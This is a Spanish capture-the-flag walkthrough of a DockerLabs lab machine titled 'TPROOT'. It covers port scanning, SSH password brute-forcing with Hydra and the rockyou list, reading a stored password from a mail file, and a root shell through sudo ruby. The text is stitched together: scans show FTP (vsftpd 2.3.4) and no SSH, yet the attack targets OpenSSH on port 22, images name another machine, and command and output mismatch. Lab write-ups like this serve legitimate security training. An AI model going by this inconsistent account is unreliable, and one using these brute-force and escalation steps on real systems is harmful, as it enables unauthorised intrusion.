# TPROOT
## INDICACIONES PREVIAS
* Sistema operativo: Kali Linux
* Terminal: ZSH Powerlevel10K
* Utilidad mkt definida en la zshrc para la creación automática de directorios nmap, content y scripts.
* Cat aliseado como bat.
## DESPLIEGUE DE MÁQUINA
1. Descargarla desde la plataforma DockerLabs.
2. En mi caso, yo me creo un directorio con el nombre de la máquina para tenerlo todo más organizado, por lo que mediante el comando mv (`mv ~/Downloads/<máquina.zip> ~/Desktop/Máquinas/Dockerlabs/<máquina>`) la moveré de descargas a la nueva ubicación.
3. Una vez hecho esto, la descomprimiremos mediante unzip <máquina.zip> y se nos creará un ejecutable .tar
4. Por último, la desplegaremos mediante sudo bash auto_deploy.sh <máquina.tar> y se nos proporcionará una IP, en mi caso 172.17.0.2.
## EXPLOTACIÓN Y ESCALADA DE PRIVILEGIOS
Primero comprobaremos la conectividad con la máquina. 
```ruby
> ping -c1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=4.45 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 4.447/4.447/4.447/0.000 ms
```

* c1 (count 1) para indicar que solo queremos mandar un paquete ICMP y después termine de enviar paquetes. 

* De aquí podemos observar que: 
  * Se ha enviado un paquete y se ha recibido de vuelta, por lo que hay conectividad con la máquina.
  * Tenemos un ttl = 64, lo que quiere decir que nos encontramos ante un sistema Linux.

Una vez visto que tenemos conectividad comenzaremos con el escaneo de puertos.  Para ello ejecutaremos:
```ruby
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
```
* Con -p- escaneamos el rango completo de puertos (65535).
* Con --open añadimos que de esos solo nos interesan los abiertos.
* Con -sS seleccionamos que el tipo de escaneo será de tipo SYN Scan. Este se caracteriza por ser rápido y sigiloso puesto que no se completa el three-way handshake.
  * Según la respuesta del puerto, Nmap deduce su estado:
    * SYN/ACK recibido → el puerto está abierto.
    * RST (Reset) recibido → el puerto está cerrado.
    * Sin respuesta o ICMP error → el puerto está filtrado (por firewall).
  * Si el puerto estaba abierto (SYN/ACK), Nmap no completa la conexión: envía un RST para interrumpir el handshake y no dejar un rastro evidente.
* Con --min-rate 5000 indicamos que queremos un envío de 5000 paquetes por segundo.
* Con -vvv (triple verbose) se muestra por consola la información detallada y actualizada al momento.
* Con -n indicaremos que no queremos resolución DNS, trabajaremos directamente con direcciones IP.
* Con -Pn queremos que no se haga ping al host antes de comenzar el escaneo, asumiendo que está activo.
* Por último, con -oG exportamos la evidencia en un archivo con formato grepeable para facilitar su procesamiento en auditorias.

Para simplificarnos el visionado de los puertos abiertos directamente abriremos el archivo *allPorts*.
```ruby
❯ cat allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: allPorts
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Mon Sep 15 18:37:36 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
   2   │ # Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
   3   │ Host: 172.17.0.2 () Status: Up
   4   │ Host: 172.17.0.2 () Ports: 21/open/tcp//ftp///, 80/open/tcp//http///    Ignored State: closed (65533)
   5   │ # Nmap done at Mon Sep 15 18:37:38 2025 -- 1 IP address (1 host up) scanned in 1.43 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Una vez localizados los puertos abiertos, continuaremos con el escaneo específico de los mismos para ver que servicios y versiones corren por ellos.
```bash
❯ nmap -p22,80 -sCV 172.17.0.2 -oN targeted
```

* El parámetro -sCV es una conjunción de los parámetros:
  * -sC: Ejecuta los scripts de Nmap por defecto (Default Scripts) para el host/puerto para detectar vulnerabilidades básicas, información de banners, servicios públicos, etc..
  * -sV: Detecta la versión del servicio que corre en cada puerto abierto.
* Con -oN exportamos la evidencia en un archivo con formato Nmap para dejarlo registrado.

Al igual que antes, para que la visualización de toda la información sea más cómoda, la analizaremos desde el archivo *targeted* que acabamos de generar.
```java
❯ cat targeted -l java
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: targeted
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.95 scan initiated Mon Sep 15 18:40:54 2025 as: /usr/lib/nmap/nmap --privileged -p21,80 -sCV -oN targeted 172.17.0.2
   2   │ Nmap scan report for 172.17.0.2
   3   │ Host is up (0.00075s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 21/tcp open  ftp     vsftpd 2.3.4
   7   │ |_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
   8   │ 80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
   9   │ |_http-title: Apache2 Ubuntu Default Page: It works
  10   │ |_http-server-header: Apache/2.4.58 (Ubuntu)
  11   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
  12   │ Service Info: OS: Unix
  13   │ 
  14   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  15   │ # Nmap done at Mon Sep 15 18:41:02 2025 -- 1 IP address (1 host up) scanned in 7.86 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Vemos que la versión que presenta el servicio OpenSSH es inferior a la 7.7 y recordemos que estas versiones presentan vulnerabilidades conocidas.  Para cercionarnos lo comprobaremos con [SearchSploit](https://github.com/topics/searchsploit).
```
❯ searchsploit "Open SSH 7.6p1"
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
OpenSSH 2.3 < 7.7 - Username Enumeration                                                                                                                   | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                                                                                             | linux/remote/45210.py
OpenSSH < 7.7 - User Enumeration (2)                                                                                                                       | linux/remote/45939.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Efectivamente si hay una vulnerabilidad pero, viendo el código de los scripts utilizan librerías y versiones inferiores a las que tengo yo ahora mismo en uso.  Como no quiero tener que modificar mi sistema o configurar un contenedor voy a analizar primero la web a ver si encuentro algo de información relevante.

![Imagen web](https://github.com/JavieRR13/WriteUps/blob/0636f486d49a3e42456c54df229bc5b539aed588/DockerLabs/Muy%20f%C3%A1cil/Vacaciones/Im%C3%A1genes/Vacaciones_Web.png)

Podemos observar que nos encontramos con una web totalmente en blanco pero, si inspeccionamos el código fuente de la página nos encontramos con un mensaje puesto en un comentario HTML que no deberia estar ahi.
En el mensaje se obtienen dos nombres los cuales podrian ser usuarios de sistema válidos para el servicio OpenSSH que hemos visto anteriormente.
Lo que voy a hacer va a ser crearme un archivo de texto con los dos nombres (aunque tambien se pueden escribir enel propio parámetro separado por comas) y lanzar la herramienta [Hydra](https://github.com/vanhauser-thc/thc-hydra) con el diccionario [rockyou](https://github.com/topics/rockyou-wordlist) para ver si encuentra alguna contraseña.

```ruby
❯ echo "camilo\njuan" > nombres.txt
❯ cat nombres.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: nombres.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ camilo
   2   │ juan
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ hydra -L nombres.txt -P /usr/share/wordlists/rockyou.txt -f ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-11 23:23:53
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: password1
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-11 23:23:54
```
* Con -L seleccionamos el archivo que hemos creado.
* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.

Vemos que este ataque ha sido satisfactorio y hemos encontrado una contraseña válida para el usuario *camilo*.
Ahora que ya tenemos usuario y contraseña accederemos al servicio SSH para comenzar con el escalado de privilegios.
```ruby
❯ ssh camilo@172.17.0.2
camilo@172.17.0.2's password: 
$ whoami
camilo
```

Para continuar, vamos a intentar listar todos los privilegios de *sudo* del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo.
```ruby
$ sudo -l
[sudo] password for camilo: 
Sorry, user camilo may not run sudo on 8ff01ee76a19.
```
Vemos que nos ha devuelto que el comando *sudo* no se ha encontrado así que no listaremos permisos de sudoers.  Esto puede ser por:
* El sistema está minimalista (por ejemplo, contenedores, sistemas de pruebas, o ciertos servidores SSH).
* Tu usuario no tiene permisos para sudo, o sudo no está instalado.

La siguiente opción es buscar permisos SUID.  El SUID (Set User ID) es un bit especial de permisos en sistemas tipo Unix/Linux que se aplica a archivos ejecutables. Su función principal es permitir que un programa se ejecute con los permisos del propietario del archivo, en lugar de los permisos del usuario que lo ejecuta. Esto puede ser útil para ciertas tareas que requieren privilegios elevados, sin dar acceso completo al usuario.  Para ello ejecutaremos: 

```ruby
$ find / -perm /4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/sudo
/bin/su
/bin/umount
/bin/mount
```

* Con find buscamos archivos y directorios en Linux.
* Con / indicamos desde la raíz del sistema (es decir, busca en todo el sistema de archivos).
* Con -type filtramos el tipo de archivo que queremos encontrar.
* f significa *file* (archivo regular).
* Con -perm filtramos por permisos específicos.
* El bit 4000 corresponde al bit SUID:
  * 4000 indica “ejecutar con los permisos del propietario”.
  * El - antes de 4000 significa que cualquier archivo que tenga este bit SUID activado será incluido, aunque tenga otros permisos también.
* Con 2>/dev/null conseguimos que la salida solo muestre los archivos válidos y no los errores.
  * 2 es el descriptor de error (stderr).
  * /dev/null es un archivo especial en Linux que descarta todo lo que se escriba en él.

En esta salida podemos ver que no encontramos ningún binario que nos pueda proporcionar un escalado de privilegios de forma sencilla, por lo que decido investigar por el sistema a ver si hay algún archivo o directorio que pueda contener algo de información.

```ruby
❯ ssh camilo@172.17.0.2
camilo@172.17.0.2's password: 
Last login: Mon Sep 15 12:50:10 2025 from 172.17.0.1
$ pwd
/home/camilo
$ cd ..
$ ls -a -R
.:
.  ..  camilo  juan  pedro

./camilo:
.  ..  .bash_logout  .bashrc  .profile

./juan:
.  ..  .bash_logout  .bashrc  .profile

./pedro:
.  ..  .bash_logout  .bashrc  .profile
$ cd ..
$ ls -a
.  ..  .dockerenv  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
$ ls -a var
.  ..  backups  cache  lib  local  lock  log  mail  opt  run  spool  tmp  www
$ ls -a var/mail
.  ..  camilo
$ ls -a var/mail/camilo
.  ..  correo.txt
$ cat var/mail/camilo/correo.txt
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
$ 
```
Trasteando por el sistema un rato encontramos un archivo *correo.txt* el cual parece tener alojada las credenciales de acceso del un usuario de sistema que, según la estructura de directorios, puede ser o *juan* o *pedro*.
Para continuar probaremos con ambos usuarios y veremos si desde esa máquina si podemos listar comandos con permisos de sudo.

```ruby
❯ ssh juan@172.17.0.2
juan@172.17.0.2's password: 
$ whoami
juan
```

Una vez dentro de la máquina víctima, vamos a intentar listar todos los privilegios de sudo del usuario actual. Es decir, mostrar qué comandos puede ejecutar con sudo y cómo. 
```ruby
$ sudo -l
Matching Defaults entries for juan on bce9d6585f7e:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on bce9d6585f7e:
    (ALL) NOPASSWD: /usr/bin/ruby
```
Sabiendo que podemos ejecutar Ruby con permisos de administrador, podemos buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/ruby/) alguna forma de establecer una shell remota, puesto que esta se ejecutará con los permisos del usuario que la haya lanzado. 
![GTFOBins](https://github.com/JavieRR13/WriteUps/blob/242fbbf07762eec1c756edfa85ea9554b0ea935c/DockerLabs/Muy%20f%C3%A1cil/Vacaciones/Im%C3%A1genes/Vacaciones_GTFOBins.png)
```ruby
$ sudo ruby -e 'exec "/bin/sh"'
# whoami
root
````
🥳CONSEGUIDO, SOMOS ROOT🥳
